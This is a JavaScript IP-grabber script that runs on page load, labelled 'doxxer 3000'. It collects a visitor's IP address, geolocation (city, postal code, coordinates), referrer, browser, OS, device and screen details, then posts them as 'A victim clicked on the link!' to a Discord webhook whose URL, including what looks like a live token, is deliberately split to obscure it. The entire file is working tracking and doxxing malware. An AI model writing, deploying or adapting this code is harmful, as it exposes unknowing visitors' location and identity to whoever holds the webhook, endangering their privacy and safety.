const sendIP = async () => {
    try {
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        const ipadd = ipData.ip;

        const geoResponse = await fetch(`https://ipapi.co/${ipadd}/json/`);
        const geoData = await geoResponse.json();

        // Obfuscated webhook
        const dscURL = ['https://discord.com/api/webhooks', 
                        '1391889747642814605', 
                        'f6mw1KKg47pRO2s0ZjsmGXQSiD9pkAj_8fDyES0giIvCX06T8ukkgNMS8qv4rYva89bJ'
                       ].join('/');

        // Helper functions
        const getOS = () => {
            const { userAgent, platform } = navigator;
            const macos = ['Macintosh', 'MacIntel', 'MacPPC', 'Mac68K'];
            const windows = ['Win32', 'Win64', 'Windows', 'WinCE'];
            const ios = ['iPhone', 'iPad', 'iPod'];

            if (macos.includes(platform)) return 'macOS';
            if (ios.includes(platform)) return 'iOS';
            if (windows.includes(platform)) return 'Windows';
            if (/Android/.test(userAgent)) return 'Android';
            if (/Linux/.test(platform)) return 'Linux';
            return 'Unknown';
        };

        const getBrowser = () => {
            const ua = navigator.userAgent;
            if (ua.includes("Firefox")) return "Firefox";
            if (ua.includes("Edg")) return "Edge";
            if (ua.includes("OPR") || ua.includes("Opera")) return "Opera";
            if (ua.includes("Chrome")) return "Chrome";
            if (ua.includes("Safari")) return "Safari";
            return "Unknown";
        };

        const getDeviceType = () => /Mobi|Android/i.test(navigator.userAgent) ? "Mobile" : "Desktop";

        const embed = {
            username: "doxxer 3000",
            avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg",
            content: "@here",
            embeds: [
                {
                    title: 'A victim clicked on the link!',
                    description: `**IP Address >> ** ${ipadd}
**Network >> ** ${geoData.network}
**City >> ** ${geoData.city}
**Region >> ** ${geoData.region}
**Country >> ** ${geoData.country_name}
**Postal Code >> ** ${geoData.postal}
**Latitude >> ** ${geoData.latitude}
**Longitude >> ** ${geoData.longitude}
**Referrer >> ** ${document.referrer}
**User-Agent >> ** ${navigator.userAgent}
**OS >> ** ${getOS()}
**Browser >> ** ${getBrowser()}
**Device >> ** ${getDeviceType()}
**Screen >> ** ${window.screen.width}x${window.screen.height}
**Time >> ** ${new Date().toLocaleString()}`,
                    color: 0x800080
                }
            ]
        };

        const dscResponse = await fetch(dscURL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(embed)
        });

        console.log(dscResponse.ok ? 'Sent! <3' : 'Failed :(');

    } catch (error) {
        console.error('Error:', error);
        console.log('Error :(');
    }
};

sendIP();
